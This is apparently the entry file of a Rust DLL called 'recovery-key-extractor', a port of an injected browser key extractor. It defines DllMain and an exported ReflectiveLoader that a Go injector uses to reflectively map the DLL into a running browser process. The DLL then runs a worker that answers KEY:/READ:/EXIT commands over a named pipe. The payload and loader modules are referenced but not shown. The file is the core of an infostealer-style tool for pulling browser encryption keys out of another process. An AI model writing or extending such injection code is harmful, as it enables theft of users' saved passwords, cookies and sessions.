//! recovery-key-extractor — Rust port of the injected browser key extractor.
//!
//! On DLL_PROCESS_ATTACH the DLL reads the `RECOVERY_PIPE` environment
//! variable and spawns a worker thread that services `KEY:`/`READ:`/`EXIT`
//! commands over that named pipe. The DLL is reflectively mapped into the
//! browser process by the Go injector, which starts a thread on the exported
//! `ReflectiveLoader` entry point; that loader (see `reflective.rs`) maps the
//! image, resolves imports and relocations, and finally invokes `DllMain`.

#![allow(clippy::missing_safety_doc)]
#![allow(non_snake_case)]

mod abi;
mod payload;
mod reflective;

use core::ffi::c_void;

const DLL_PROCESS_ATTACH: u32 = 1;

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(h_instance: *mut c_void, reason: u32, _reserved: *mut c_void) -> i32 {
    if reason == DLL_PROCESS_ATTACH {
        unsafe {
            let _ = abi::DisableThreadLibraryCalls(h_instance as usize);
        }
        payload::on_attach();
    }
    1
}

/// Reflective loader entry point. The Go injector resolves this export by name
/// and starts a thread on it inside the target process.
#[unsafe(no_mangle)]
#[inline(never)]
pub extern "system" fn ReflectiveLoader(lpParameter: usize) -> usize {
    reflective::loader_impl(lpParameter)
}
